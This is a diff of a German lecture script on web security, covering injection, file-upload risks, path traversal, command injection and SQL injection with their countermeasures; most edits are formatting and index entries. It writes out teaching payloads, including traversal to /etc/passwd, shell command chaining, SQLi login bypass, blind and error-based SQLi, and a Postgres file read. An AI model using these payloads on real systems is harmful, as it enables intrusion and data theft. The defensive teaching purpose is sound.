@@ -4,33 +4,36 @@ Ein Grundsatz der Programmierung ist \textit{Garbage-In, Garbage-Out}. In Anlehn
 
 Benutzern kann nicht getraut werden. Während gutartige Benutzer bestenfalls wirre Eingaben erstellen, werden durch bösartige Benutzer Eingaben durchgeführt, die gezielt die Sicherheit eines Systems kompromittieren sollten. Das Grundmuster ist, dass eine Benutzereingabe als Kommando interpretiert wird. Dies wird durch Angreifer ausgenutzt um, von der Applikation ungewollte, Kommandos abzusetzen. Diese Kommandos werden dann mit den Rechten der Webapplikation (oder eines weiteren Hintergrundsystems) ausgeführt.
 
-Ein Problem ist die große Angriffsfläche da nicht nur die direkt Eingabe-verarbeitenden Stellen überprüft werden müssen, sondern alle Programmteile die potentiell Benutzereingaben indirekt erhalten können (z. B. Daten aus deiner Datenbank auslesen, die ursprünglich von einem Benutzer bereitgestellt wurden). Ebenso muss ein Ausbruch nicht direkt am angegriffenen System erfolgen, sondern kann auch auf Hintergrundsystemen passieren. Beispielsweise kann ein Angreifer eine Webapplikation angreifen, bricht aber erst auf Datenbankebene aus dem System aus (auf einem getrennten Datenkbankserver).
+Ein Problem ist die große Angriffsfläche da nicht nur die direkt Eingabe-verarbeitenden Stellen überprüft werden müssen, sondern alle Programmteile die potentiell Benutzereingaben indirekt erhalten können (z.B. Daten aus deiner Datenbank auslesen, die ursprünglich von einem Benutzer bereitgestellt wurden). Ebenso muss ein Ausbruch nicht direkt am angegriffenen System erfolgen, sondern kann auch auf Hintergrundsystemen passieren. Beispielsweise kann ein Angreifer eine Webapplikation angreifen, bricht aber erst auf Datenbankebene aus dem System aus (auf einem getrennten Datenkbankserver).
 
-Da Tests auf Injection-Angriffe meist gegen bestimmte Operationen und bestimmte Hintergrundsysteme gerichtet sind (z. B. gegen eine MSSQL Datenbank) werden zumeist Dutzende oder Hunderte Angriffsmuster durchprobiert. Aus Effizienzgründen wird hier sehr stark auf automatisierte Tools gesetzt.
+Da Tests auf Injection-Angriffe meist gegen bestimmte Operationen und bestimmte Hintergrundsysteme gerichtet sind (z.B. gegen eine MSSQL Datenbank) werden zumeist dutzende oder hunderte Angriffsmuster durchprobiert. Aus Effizienzgründen wird hier sehr stark auf automatisierte Tools gesetzt.
 
-Der Verteidigungsgrundsatz ist es, niemals Benutzerdaten zu vertrauen. Alle Benutzereingaben müssen auf Schadmuster hin überprüft werden, falls Schadcode entdeckt wird, muss die Eingabe verworfen oder gecleaned werden. Aufgrund der vielen verschiedenen Angriffsmuster ist dies nur mittels Bibliotheken sinnvoll möglich. Benutzereingaben dürfen niemals direkt zur Erstellung dynamischer Operationen verwendet werden. Die meisten Frameworks bieten dezidierte Möglichkeiten um Benutzereingaben in Operationen zu inkludieren (z. B. \textit{prepared statements}), bei diesen wird automatisch eine Filterung von Schadcode durchgeführt. Und schlussendlich sollten alle Benutzerausgaben noch sanitized bzw. maskiert werden bevor sie wieder angezeigt werden. Dadurch wird verhindert, dass Operationen im Kontext eines anderen Benutzers ausgeführt werden.
+Der Verteidigungsgrundsatz ist es, niemals Benutzerdaten zu vertrauen. Alle Benutzereingaben müssen auf Schadmuster hin überprüft werden, falls Schadcode entdeckt wird, muss die Eingabe verworfen oder gecleaned werden. Aufgrund der vielen verschiedenen Angriffsmuster ist dies nur mittels Bibliotheken sinnvoll möglich. Benutzereingaben dürfen niemals direkt zur Erstellung dynamischer Operationen verwendet werden. Die meisten Frameworks bieten dezidierte Möglichkeiten um Benutzereingaben in Operationen zu inkludieren (z.B. \textit{prepared statements}), bei diesen wird automatisch eine Filterung von Schadcode durchgeführt. Und schlussendlich sollten alle Benutzerausgaben noch bereinigt bzw. maskiert werden bevor sie wieder angezeigt werden. Dadurch wird verhindert, dass Operationen im Kontext eines anderen Benutzers ausgeführt werden.
 
 Als zusätzliche Hardening-Maßnahme können Sandboxing-Konzepte, optionale HTTP Security-Header und IDS/IPS-Systeme verwendet werden.
 
 \section{File Uploads}
+\index{File-Uploads}
 
-Wenn ein Benutzer bei einer Webseite Dateien hochladen und der idente Benutzer (oder ein anderer Benutzer) danach wieder auf diese Dateien zugreifen kann, ergeben sich zwei Gefährdungsmomente. Einerseits kann der idente Benutzer versuchen, mit dem hochgeladenen File den Server direkt anzugreifen (z. B. um Code am Server auszuführen), auf der anderen Seite kann ein Angreifer versuchen, auf diese Weise einen anderen Benutzer anzugreifen (z. B. um dessen Session zu übernehmen).
+Wenn ein Benutzer bei einer Webseite Dateien hochladen und der idente Benutzer (oder ein anderer Benutzer) danach wieder auf diese Dateien zugreifen kann, ergeben sich zwei Gefährdungsmomente. Einerseits kann der idente Benutzer versuchen, mit dem hochgeladenen File den Server direkt anzugreifen (z.B. um Code am Server auszuführen), auf der anderen Seite kann ein Angreifer versuchen, auf diese Weise einen anderen Benutzer anzugreifen (z.B. um dessen Session zu übernehmen).
 
 \subsection{Das Upload-Verzeichnis}
 
 In einer sicherheitstechnisch guten Webapplikation sind alle Dateien und Verzeichnisse schreibgeschützt --- Angriffe, die serverseitig Dateien erstellen oder modifizieren müssen, werden dadurch erschwert. Die einzige Ausnahme sollte das Upload-Verzeichnis sein in welches die Webapplikation (bzw. der Systemuser der Webapplikation) schreibend zugreifen darf.
 
-Dieses Verzeichnis sollte niemals unterhalb des Webroots liegen, falls z. B. der Webroot \url{/var/www/html} ist, sollte das Uploadsvereichnis sich nicht unter \url{/var/www/html/uploads} befinden. Würde das Verzeichnis so situiert sein, kann der Webserver bei einem Zugriff auf ein hochgeladenes File schwer unterscheiden, ob eine hochgeladene Datei zum ``normalen'' Umfang der Webapplikation gehört, oder ob es sich um eingeschleusten Schadcode handelt. Zusätzlich sollten Directory-Listings für dieses Verzeichnis deaktiviert werden und das Verzeichnis auf einer Partition mit aktivierter \textit{noexec} Mount-Option (bei Verwendung von Linux) platziert werden.
+Dieses Verzeichnis sollte niemals unterhalb des Webroots liegen, falls z.B. der Webroot \url{/var/www/html} ist, sollte das Uploadsvereichnis sich nicht unter \url{/var/www/html/uploads} befinden. Würde das Verzeichnis so situiert sein, kann der Webserver bei einem Zugriff auf ein hochgeladenes File schwer unterscheiden, ob eine hochgeladene Datei zum ``normalen'' Umfang der Webapplikation gehört, oder ob es sich um eingeschleusten Schadcode handelt. Zusätzlich sollten Directory-Listings für dieses Verzeichnis deaktiviert werden und das Verzeichnis auf einer Partition mit aktivierter \textit{noexec} Mount-Option (bei Verwendung von Linux) platziert werden.
 
 Der Dateiname, unter dem ein hochgeladenes File abgelegt wird, sollte niemals durch den User bestimmt werden. Dies würde path traversal Angriffe erlauben\footnote{Diese werden im Kapitel Injection Attacks erklärt.} bzw. könnte ein Angreifer den bekannten Pfad zu einem File im Zuge von weiteren Injection-Angriffen verwenden.
 
-Ein architekturelles Problem ist durch die Struktur von Webapplikationen bedingt. Eine deployte Webapplikation besteht meistens aus einem Webserver und einem Applikationsserver. Ersterer ist für die Zustellung statischer Dateien optimiert, letzterer beinhaltet die Applikationslogik inkl. der Zugriffskontrollen. Werden Dateien direkt über ein Upload-Verzeichnis bereitgestellt, übernimmt diese Aufgabe der Webserver (der für diese statische Zustellung optimiert ist) und nicht der Applikationsserver --- in diesem Fall kann es passieren, dass die Authentication und Authorization nicht überprüft wird. Um dies zu vermeiden, sollte ein Download immer mittels einer dezidierten Downloadoperation, z. B. mittels \url{https://example.local/download?file_id=xxx}, durchgeführt, und auf diese Weise durch den Applikationsserver ausgeführt werden. Dabei sollten serverseitig die benötigten Zugriffsrechte überprüft werden, als Id wird die Verwendung einer zufälligen ID wie z. B. einer UUID empfohlen.
+Ein architekturelles Problem ist durch die Struktur von Webapplikationen bedingt. Eine deployte Webapplikation besteht meistens aus einem Webserver und einem Applikationsserver. Ersterer ist für die Zustellung statischer Dateien optimiert, letzterer beinhaltet die Applikationslogik inkl. der Zugriffskontrollen. Werden Dateien direkt über ein Upload-Verzeichnis bereitgestellt, übernimmt diese Aufgabe der Webserver (der für diese statische Zustellung optimiert ist) und nicht der Applikationsserver --- in diesem Fall kann es passieren, dass die Authentication und Authorization nicht überprüft wird. Um dies zu vermeiden, sollte ein Download immer mittels einer dezidierten Downloadoperation, z.B. mittels \url{https://example.local/download?file_id=xxx}, durchgeführt, und auf diese Weise durch den Applikationsserver ausgeführt werden. Dabei sollten serverseitig die benötigten Zugriffsrechte überprüft werden, als Id wird die Verwendung einer zufälligen ID wie z.B. einer UUID empfohlen.
 
 \subsection{Upload von Malicious Files}
+\index{HTTP Header!Content-Disposition}
+\index{Content-Disposition}
 
-Ein einfacher Angriff ist der der Upload von Dateien, die Code zur serverseitigen Ausführung beinhalten --- z. B. das Hochladen von einer \textit{.php} Datei bei Verwendung einer PHP Webapplikation. Der Angreifer würde nach dem Upload auf die Datei zugreifen und dadurch den Code am Server zur Ausführung bringen. Bei einem File-Upload sollten daher die möglichen Dateitypen durch eine Whitelist auf Dateitypen, die nicht am Server exekutiert werden, beschränkt werden. Ebenso sollte mittels dem \textit{Content Disposition} HTTP Header dem Browser mitgeteilt werden, dass eine bezogene Datei explizit heruntergeladen sollte (und nicht als Teil der Webapplikation ausgeführt werden sollte).
+Ein einfacher Angriff ist der der Upload von Dateien, die Code zur serverseitigen Ausführung beinhalten --- z.B. das Hochladen von einer \textit{.php} Datei bei Verwendung einer PHP Webapplikation. Der Angreifer würde nach dem Upload auf die Datei zugreifen und dadurch den Code am Server zur Ausführung bringen. Bei einem File-Upload sollten daher die möglichen Dateitypen durch eine Whitelist auf Dateitypen, die nicht am Server exekutiert werden, beschränkt werden. Ebenso sollte mittels dem \textit{Content Disposition} HTTP Header dem Browser mitgeteilt werden, dass eine bezogene Datei explizit heruntergeladen sollte (und nicht als Teil der Webapplikation ausgeführt werden sollte).
 
-Eine weitere Empfehlung ist die Verwendung eines server-seitigen Virenscanners. Diese arbeiten zumeist auf Dateisystem-Basis --- wird ein File mit bösartigem Code hochgeladen, wird dieses gescannt und gegebenenfalls unter Quarantäne gestellt bzw. gelöscht. Da die Webapplikation dies nicht automatisch bemerkt, kann es dabei zu Inkonsistenzen zwischen dem Dateisystem und verlinkten Dateien in der Webapplikation kommen. Eine saubere, aber aufwendige, Lösung wäre die Integration des Virenscanners in den Upload-Prozess der Webapplikation (z. B. über ein API des Virenscanners). Ein workaround wäre es, falls der Virenscanner beim Löschen einer Datei eine gleichnamige Datei mit einem Löschhinweis hinterlegt. Auf diese Werden werden die toten Dateilinks innerhalb der Applikation vermieden.
+Eine weitere Empfehlung ist die Verwendung eines server-seitigen Virenscanners. Diese arbeiten zumeist auf Dateisystem-Basis --- wird ein File mit bösartigem Code hochgeladen, wird dieses gescannt und gegebenenfalls unter Quarantäne gestellt bzw. gelöscht. Da die Webapplikation dies nicht automatisch bemerkt, kann es dabei zu Inkonsistenzen zwischen dem Dateisystem und verlinkten Dateien in der Webapplikation kommen. Eine saubere, aber aufwendige, Lösung wäre die Integration des Virenscanners in den Upload-Prozess der Webapplikation (z.B. über ein API des Virenscanners). Ein workaround wäre es, falls der Virenscanner beim Löschen einer Datei eine gleichnamige Datei mit einem Löschhinweis hinterlegt. Auf diese Werden werden die toten Dateilinks innerhalb der Applikation vermieden.
 
 Besondere Beachtung sollte der Upload von gepackten Dateien (\textit{zip}, \textit{rar}) erhalten. Hier muss auf der einen Seite beachtet werden, dass Archive entpackt und der Inhalt des Archivs ebenso analysiert wird, auf der anderen Seite muss darauf geachtet werden, dass während des Entpackvorgangs kein Sicherheitsfehler passiert.
 
@@ -45,20 +48,22 @@ Wird server-seitig ein Virenscanner verwendet um hochgeladene Dateien auf Schadc
 Techniken in diesem Umfeld beinhalten chroots, Jails, Container und Microservice-Architekturen.
 
 \section{Path Traversals}
+\index{Path Traversals}
 
 Bei einem Path Traversal wird versucht, über modifizierte Parameter auf Ressourcen außerhalb des Webroots einer Webapplikation zuzugreifen. Auf diese Weise kann versucht werden, auf applikations-externe Ressourcen lesend oder schreibend zuzugreifen bzw. kann versucht werden, ausführbare Dateien am Server zu starten.
 
 Ein Beispiel für eine potentiell angreifbare Operation wäre \url{https://opfer.local/GetImage.jsp?file=diagram.jpg}. Ein Angreifer könnte versuchen, über den Wert \textit{./../../../../etc/passwd} für den Parameter \textit{file} auf eine Datei außerhalb des Webroots zuzugreifen.
 
-Als Gegenmaßnahme sollte primär versucht werden, nicht Dateinamen als benutzer-gesteuerten Parameter zu verwenden. Falls dies wirklich notwendig ist, sollten die Dateinamen gegen eine rigorose Whitelist und auf invalide Steuersignale hin (z. B. NULL-Characters und Zeilenumbrüche) überprüft werden und vor dem Zugriff auf Ressourcen der kanonische Pfad gebildet und verifiziert werden.
+Als Gegenmaßnahme sollte primär versucht werden, nicht Dateinamen als benutzer-gesteuerten Parameter zu verwenden. Falls dies wirklich notwendig ist, sollten die Dateinamen gegen eine rigorose Whitelist und auf invalide Steuersignale hin (z.B. NULL-Characters und Zeilenumbrüche) überprüft werden und vor dem Zugriff auf Ressourcen der kanonische Pfad gebildet und verifiziert werden.
 
-Eine weitere Sicherheitsmaßnahme wäre der Einsatz von Sandboxing-Techniken wie eines \textit{chroot}. Durch Anwendung des Separation of Privileges Prinzips wird das Schadmass verkleinert: der Webserver sollte nur auf Dateien zugreifen können die für den Webserver relevant sind. Weitere Dateien (wie z. B. Systemdateien) sollten weder lesend noch schreibend zugreifbar sein.
+Eine weitere Sicherheitsmaßnahme wäre der Einsatz von Sandboxing-Techniken wie eines \textit{chroot}. Durch Anwendung des Separation of Privileges Prinzips wird das Schadmass verkleinert: der Webserver sollte nur auf Dateien zugreifen können die für den Webserver relevant sind. Weitere Dateien (wie z.B. Systemdateien) sollten weder lesend noch schreibend zugreifbar sein.
 
 \section{Command Injection}
+\index{Command Injection}
 
 Eine Command Injection zielt darauf ab, Binaries (Kommandozeilentools) auf dem Zielserver auszuführen, zumeist wird dies über modifizierte HTTP Operationsparameter erzielt. Beliebtes Ziel ist das Erstellen einer shell oder reverse-shell: dies erlaubt es Angreifern, ähnlich wie mittels SSH, mit den Rechten der Webapplikation Befehle am Server auszuführen.
 
-Im Zuge einer Command Injection wird ein Programm am Server ausgeführt. Da die meisten Webapplikationen losgelöst vom zugrunde liegenden System (z. B. Windows oder Linux) entwickelt werden, rufen diese selten direkt Systemkommandos auf. Eine Ausnahme sind embedded Systeme bei denen die Hardware zusammen mit der Software gebündelt geliefert wird. Gerade im Router-/AccessPoint-Umfeld werden gerne direkt Systemkommandos über die Weboberfläche aufgerufen. Dementsprechend ist das klassische Command Injection Beispiel eine typische Weboperation die von Access Points bereitgestellt wird: mittels des \textit{ping} Kommandos soll die Netzwerkkonnektivität zwischen dem Access Point und einem externen Server überprüft werden.
+Im Zuge einer Command Injection wird ein Programm am Server ausgeführt. Da die meisten Webapplikationen losgelöst vom zugrunde liegenden System (z.B. Windows oder Linux) entwickelt werden, rufen diese selten direkt Systemkommandos auf. Eine Ausnahme sind embedded Systeme bei denen die Hardware zusammen mit der Software gebündelt geliefert wird. Gerade im Router-/AccessPoint-Umfeld werden gerne direkt Systemkommandos über die Weboberfläche aufgerufen. Dementsprechend ist das klassische Command Injection Beispiel eine typische Weboperation die von Access Points bereitgestellt wird: mittels des \textit{ping} Kommandos soll die Netzwerkkonnektivität zwischen dem Access Point und einem externen Server überprüft werden.
 
 Dies könnte mit folgendem Pseudo-Python Code implementiert werden:
 
@@ -68,7 +73,7 @@ domain = user_input()
 os.system('ping ' + domain)
 \end{minted}
 
-In der Variable \textit{domain} wird eine Benutzereingabe gespeichert, es wird angenommen, dass diese ein domainname ist. Ein Angreifer könnte nun z. B. \textit{localhost; ls} als Eingabe verwenden. Durch den übergebenen ; wird bei Unix-Kommandos ein Kommando beendet und das nächste begonnen. Durch diese Verkettung versucht also der Angreifer das Kommando \textit{ls} einzuschleusen.
+In der Variable \textit{domain} wird eine Benutzereingabe gespeichert, es wird angenommen, dass diese ein domainname ist. Ein Angreifer könnte nun z.B. \textit{localhost; ls} als Eingabe verwenden. Durch den übergebenen ; wird bei Unix-Kommandos ein Kommando beendet und das nächste begonnen. Durch diese Verkettung versucht also der Angreifer das Kommando \textit{ls} einzuschleusen.
 
 Ähnliche Muster sind:
 
@@ -90,11 +95,12 @@ Beispiele hierfür:
 Um Command Injection Probleme zu umgehen wird empfohlen, Programmierbibliotheken anstatt von Kommandozeilenaufrufen zu verwenden. Da hierbei nun keine getrennte Shell geöffnet wird, kann an dieser Stelle auch kein Kommando eingefügt werden.
 
 \section{Datenbank-Injections}
+\index{SQL-Injection}
 
 Datenbank-Injections gehören zu den selteneren, dafür aber schwerwiegenderen, vorkommenden Sicherheitsfehlern. Das Grundproblem ist, dass Datenbankabfragen unter Zuhilfename von Benutzereingaben gebaut werden. Durch bösartige Benutzereingaben versuchen Angreifer nun, das Datenbanksystem zur Freigabe zusätzlicher Daten zu bringen, unbeabsichtigt Daten zu verändern oder sogar aus dem Datenbanksystem auf das Betriebssystem auszubrechen.
 
 \subsection{SQL}
-\index{sql}
+\index{SQL}
 
 SQL\footnote{Structured Query Language} ist die bekannteste Abfragesprache für relationale Datenbanken. Im Zuge dieser Vorlesung werden nur einfache SQL-Features benötigt. Ein Beispiel für ein einfaches SQL Statement:
 
@@ -121,7 +127,7 @@ Dies ist nur möglich, wenn beide verwendeten SQL-Queries die idente Anzahl von 
 
 Die einfachste Form der SQL-Injection basiert darauf, dass die Applikation eine String-Concatenation zur Erstellung des SQL-Ausdrucks verwendet. Der Angreifer versucht einen Wert zu übergeben der, wenn er in den SQL-String eingesetzt wird, zuerst den bestehenden SQL-Ausdruck beendet/schließt und danach zusätzlich Code ausführt.
 
-Als Beispiel wird hier ein Login verwendet, der über folgende HTTP Operation durchgeführt wird: \url{https://kino.local/login.php?email=ah@coretec&password=pw}. Der Angreifer vermutet, dass die Überprüfung des Logins über eine Datenbank-Abfrage ausgeführt wird, die z. B. in Java als String erstellt wird:
+Als Beispiel wird hier ein Login verwendet, der über folgende HTTP Operation durchgeführt wird: \url{https://kino.local/login.php?email=ah@coretec&password=pw}. Der Angreifer vermutet, dass die Überprüfung des Logins über eine Datenbank-Abfrage ausgeführt wird, die z.B. in Java als String erstellt wird:
 
 \begin{minted}{java}
 String query = "select * from users where email = '" +email+ "' and password = '" +password +"' limit 1;";
@@ -129,7 +135,7 @@ String query = "select * from users where email = '" +email+ "' and password = '
 
 Die Email-Adresse und das Passwort wird als Teil der Datenbank-Abfrage verwendet, wird ein Datensatz zurückgegeben wird der erste Datensatz vermutlich zur Befüllung der Benutzersession verwendet. Wird kein Datensatz zurückgegeben nimmt die Applikation an, dass der Login nicht erfolgreich war.
 
-Ein Angreifer würde nun z. B. folgendes Fragment als Passwort übergeben:
+Ein Angreifer würde nun z.B. folgendes Fragment als Passwort übergeben:
 
 \begin{minted}{text}
 1' or '1'='1
@@ -144,7 +150,7 @@ String query = "select * from users where email = 'ah@coretec.at' and password =
 Anstatt dass die Email-Adresse und das Passwort überprüft werden, wird nun initial die Email und das Passwort überprüft. Dabei wird wahrscheinlich als Ergebnis \textit{false} erzeugt, damit würde prinzipiell kein Datensatz zurückgegeben werden. Der Angreifer schafft es allerdings, auch den Ausdruck \textit{1=1} hinzuzufügen. Dieser ergibt immer \textit{true}, durch die Oder-Verknüpfung wird der Gesamtausdruck \textit{true} und liefert daher alle Zeilen der Tabelle als Resultat. Der Applikationscode würde nun die erste Zeile extrahieren und mit diesem Datensatz die Session befüllen. Der Angreifer hat auf diese Weise das Login-System überlistet und die Identität eines anderen Benutzers angenommen.
 
 \subsubsection{Stacked Queries}
-\index{sql!stacked queries}
+\index{SQL-Injection!Stacked Queries}
 
 Die grundsätzliche Methode an eine bestehende SQL-Abfrage zusätzliche (ungewollte) Queries anzuhängen und dadurch Code auszuführen wird Stacked Query genannt. Das klassische Beispiel für eine solche ist:
 
@@ -155,7 +161,7 @@ Die grundsätzliche Methode an eine bestehende SQL-Abfrage zusätzliche (ungewol
 Mittels des ersten Zeichens \textit{'} wird versucht aus dem vorgesehenen SQL-Ausdruck auszubrechen. Das Semikolon dient zum Beenden des eigentlichen Kommandos und der Angreifer kann ein beliebiges SQL-Kommando anhängen --- in diesem Fall ein \textit{drop table} Kommando, welches eine Datenbank löschen würde. Zum Schluss wird mit einem weiteren Semikolon der eingeschleuste Befehlt beendet und durch die beiden Bindestriche ein Kommentar eingeleitet. Auf diese Weise wird potentiell nachfolgender SQL-Code auskommentiert.
 
 \subsubsection{UNION-based SQL-Injection}
-\index{sqli!union-based sqli}
+\index{SQL-Injection!Union-based SQLi}
 
 Bei UNION-basierten SQL-Angriffen wird versucht mittels des \textit{UNION} Kommandos ein zusätzliches \textit{SELECT} Statement an ein bestehendes Select-Statement anzuhängen. Häufig wird dies verwendet, wenn eine Web-Applikation eine Tabellen-ähnliche Datenauflistung bietet.
 
@@ -184,7 +190,7 @@ Die Tabelle wird nun initial mit den Daten des Users mit der Id 1 befüllt, zus�
 Da bei einem UNION-Select die Spaltenanzahl der jeweiligen Queries ident sein muss, muss der Angreifer initial die richtige Spaltenanzahl erraten. Dies wird zumeist über Brute-Force Angriffe durchgeführt.
 
 \subsubsection{Boolean-based Blind SQL Injection}
-\index{sqli!boolean blind sqli}
+\index{SQL-Injection!Boolean blind SQLi}
 
 Eine SQL-Injection ist auch ohne direkten Antwortkanal möglich. Ein Beispiel hierfür sind Boolean-based blind SQL-Injections.
 
@@ -197,25 +203,28 @@ SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(userna
 An den Suchausdruck wird also eine Substring-Abfrage hinzugefügt. Diese extrahiert die erste Stelle des Benutzernamens, verwandelt diese über die \textit{ASCII}-Funktion in einen ASCII-Wert und überprüft, ob die erste Stelle des Benutzernamens ein A ist. Wird nun die Produktseite des Produkts 1 zurückgeliefert, weiß der Angreifer, dass das erste Zeichen des Benutzernamens ein A ist. Wird keine Produktseite geliefert, würde der Angreifer versuchen ob der ASCII Wert dem Zeichen B entspricht. Durch mehrere (tausende) Anfragen kann der Angreifer auf diese Weise die gesamte Datenbank rekonstruieren.
 
 \subsubsection{Time-based Blind SQL Injection}
-\index{sqli!time blind sqli}
+\index{SQL-Injection!time-based blind SQLi}
 
 Ähnlich wie bei einer boolean based blind SQL-Injection gibt es bei dieser Angriffsart keinen direkten Antwortkanal für die extrahierten Informationen. Anstatt wird ein side-channel Angriff auf das Zeitverhalten der Antwort angewandt.
 
 Der Angreifer besitzt die Möglichkeit ein SQL-Fragment an eine Anfrage anzuhängen und zur Exekution zu bringen. Wieder wird eine IF-Abfrage verwendet, in dem konkreten Fall wird, falls die Abfrage erfolgreich ist, die Antwort um 10 Sekunden verzögert:
 
-\url{http://www.examplecom/product.php?id=10 AND IF(ASCII(SUBSTRING(username,1,1))=97, sleep(10), ‘false’))--}
+\begin{minted}{text}
+http://www.examplecom/product.php?id=10 AND IF(ASCII(SUBSTRING(username,1,1))=97, sleep(10), ‘false’))--
+\end{minted}
 
 Als Abfrage wird der idente ``fängt der Benutzername mit A an?'' verwendet. Falls dies war sein sollte wird mittels \textit{sleep(10)} die Antwort verzögert, wenn nicht wird sofort geantwortet. Mittels vieler Abfragen kann der Angreifer auf diese Weise die gesamte Datenbank extrahieren.
 
 Im Zuge eines Time-Based Angriffs wird mehr oder weniger ein Model der Antwortzeiten aufgebaut. Da normalerweise die eingefügte Verzögerung minimiert wird (um möglichst schnell Daten extrahieren zu können) ist diese Angriffsart fehlerbehaftet und verwundbar gegenüber Netzwerk-Jitter. Falls die Netzwerkverbindung selbst instabil ist (also Anfragen aufgrund des Netzwerks unterschiedlich lange benötigen), können einzelne Zeichen invalid erkannt werden.
 
 \subsubsection{Error-based Injections}
+\index{SQL-Injection!Error-based Injections}
 
 Bei \textit{Error-based Injections} wird absichtlich ein Fehler eingebaut um über den ausgegebenen Fehlertext Informationen zu extrahieren.
 
 Ein Beispiel in MySQL: es gibt in Mysql die mathematische Funktion \textit{exp} welche ab einem übergebenen Dezimalwert von ca. 260 einen Fehler ausgibt. Ebenso gibt es den Operator \char`\~ welcher ein Bitweises Kompliment bildet. Wird dieser Operator auf das Ergebnis eines Selects angewandt, ist das Ergebnis eine sehr große Zahl.
 
-Ein Angreifer kann dieses Verhalten für eine Datenextraktion nutzen, z. B.:
+Ein Angreifer kann dieses Verhalten für eine Datenextraktion nutzen, z.B.:
 
 \begin{minted}{text}
 exp(~(select * from (select user()) x)
@@ -235,6 +244,7 @@ In der Fehlermeldung wurde allerdings der innere SQL-Ausdruck exekutiert, dadurc
 Dies ist ein weiterer Grund, warum auf einer Webseite keine detaillierten Fehlermeldungen ausgegeben werden sollten.
 
 \subsubsection{Ausbruch aus dem Datenbanksystem}
+\index{SQL-Injection!Database Break Out}
 
 Eine weitere Möglichkeit des Angreifers ist es aus dem Datenbanksystem auf das Dateisystem auszubrechen. Dadurch kann er mit den Rechten des Datenbankbenutzers entweder auf Dateien am Datenbankserver zugreifen oder besitzt dadurch sogar Shell-Access auf das System. Dies ist einer der Gründe, warum Datenbanksysteme immer mit einem eigenen Benutzer laufen sollten.
 
@@ -248,13 +258,13 @@ postgres-# COPY temp FROM '/etc/passwd';
 postgres-# SELECT * FROM temp limit 1 offset 0;
 \end{minted}
 
-MySQL bietet auch die beiden Zusätze \textit{into outfile} bzw. \textit{into dumpfile} an. Damit wird das Resultat einer SQL-Query in eine Datei gespeichert. Falls der Datenbankserver mit einer hohen Berechtigunggstufe läuft (z. B. als \textit{root} oder \textit{www-data} Benutzer) kann dies verwendet werden um Dateien im Filesystem (z. B. im Web-Root) abzulegen und auf diese Weise eine Webshell hochzuladen (diese würde dann durch den Angreifer über den Webserver geöffnet werden).
+MySQL bietet auch die beiden Zusätze \textit{into outfile} bzw. \textit{into dumpfile} an. Damit wird das Resultat einer SQL-Query in eine Datei gespeichert. Falls der Datenbankserver mit einer hohen Berechtigunggstufe läuft (z.B. als \textit{root} oder \textit{www-data} Benutzer) kann dies verwendet werden um Dateien im Filesystem (z.B. im Web-Root) abzulegen und auf diese Weise eine Webshell hochzuladen (diese würde dann durch den Angreifer über den Webserver geöffnet werden).
 
 \subsection{Gegenmaßnahmen}
 
 Da das Grundproblem von SQL-Injections die Erstellung von dynamischen SQL-Kommandos basierend auf bösartigen Benutzereingaben ist, wäre das Escapen der Eingabe die erste mögliche Gegenmaßnahme. Dabei werden die Benutzereingaben so maskiert, dass sie gefahrenlos per String-Concatenation verwendet werden können. Da diese Lösung fehleranfällig und Datenbank-spezifisch ist, sollte sie so weit wie möglich vermieden werden.
 
-Ein besserer Lösungsansatz für SQL-Injection ist die Verwendung von \textit{prepared statements}. Bei diesen wird eine SQL-Abfrage mittels einer API gebaut (und mit Daten befüllt) anstatt ``nur'' Strings zu verknüpfen. Aufgrund der zusätzlich bereitgestellten Information ist die Datenbankbibliothek in der Lage, die benutzer-bereitgestellten Daten in einer Form einzusetzen, welche SQL-Injections verhindert.
+Ein besserer Lösungsansatz für SQL-Injection ist die Verwendung von \textit{prepared statements}\index{Prepared Statements}. Bei diesen wird eine SQL-Abfrage mittels einer API gebaut (und mit Daten befüllt) anstatt ``nur'' Strings zu verknüpfen. Aufgrund der zusätzlich bereitgestellten Information ist die Datenbankbibliothek in der Lage, die benutzer-bereitgestellten Daten in einer Form einzusetzen, welche SQL-Injections verhindert.
 
 Ein Beispiel in Java:
 
@@ -291,15 +301,17 @@ Ein Problem mit prepared statements ist, dass nicht alle Elemente einer SQL-Abfr
 
 Falls diese Felder befüllt werden müssen, wird empfohlen die Applikationslogik so zu bauen, dass über die Eingabe erkannt wird, welches Feld gewählt wurde und basierend darauf ein statischer String zum Bauen der Query verwendet werden. Auf diese Weise wird vermieden, dass eine Benutzereingabe direkt in den Query-String eingebaut wird. Ebenso sollte bei einer solchen Konstruktion sowohl eine rigide Whitelist als auch Escaping verwendet werden.
 
-Ein Vorteil von Prepared Statements ist, dass die Absicherungslogik Teil der Applikationslogik ist. Andere Methoden (wie z. B. Stored Procedures) verschieben die Absicherung direkt in den Datenbankserver. Dabei besteht das Problem, dass z. B. Anwendungsentwickler annehmen könnten, dass gewisse Datenbank-Funktionen sicher implementiert wurden und Datenbank-Entwickler annehmen könnten, dass Daten bereits durch die Applikationsentwickler abgesichert wurden. Hierdurch kann es zu Diskrepanzen bei der Absicherung kommen.
+Ein Vorteil von Prepared Statements ist, dass die Absicherungslogik Teil der Applikationslogik ist. Andere Methoden (wie z.B. Stored Procedures) verschieben die Absicherung direkt in den Datenbankserver. Dabei besteht das Problem, dass z.B. Anwendungsentwickler annehmen könnten, dass gewisse Datenbank-Funktionen sicher implementiert wurden und Datenbank-Entwickler annehmen könnten, dass Daten bereits durch die Applikationsentwickler abgesichert wurden. Hierdurch kann es zu Diskrepanzen bei der Absicherung kommen.
 
-	Eine weitere Gegenmaßnahme sind \textit{Stored Procedures}. Dies sind Funktionen die im Datenbanksystem abgelegt und von der Applikation aufgerufen werden. Eine früher häufig genutzte Sprache zum Erstellen von Stored Procedures ist PL/SQL, mittlerweile können Stored Procedures auch in ``normalen'' Programmiersprachen entwickelt werden. Sie besitzen die gleichen Probleme wie applikatorische Abfragen: falls eine String-Verkettung verwendet wird, können SQL-Injections durchgeführt werden. Stored Procedures sind aber eher auf die Verwendung von Sprachmustern ausgelegt, die Injection-Angriffe vermeiden (ähnlich wie Prepared Statements) und da sie meistens von Datenbank-Spezialisten geschrieben werden, sind sie meistens sicher implementiert. Aus diesem Grund werden Stored Procedures häufig als Gegenmaßnahme zu SQL-Injections angeführt, auch wenn dies potentiell vom implementierenden Programmierer abhängig ist. Ein Nachteil von Stored Procedures ist, dass der Applikationscode dadurch auf den Applikationsserver und den Datenbankserver aufgeteilt wird und dadurch potentiell schwerer wartbar wird.
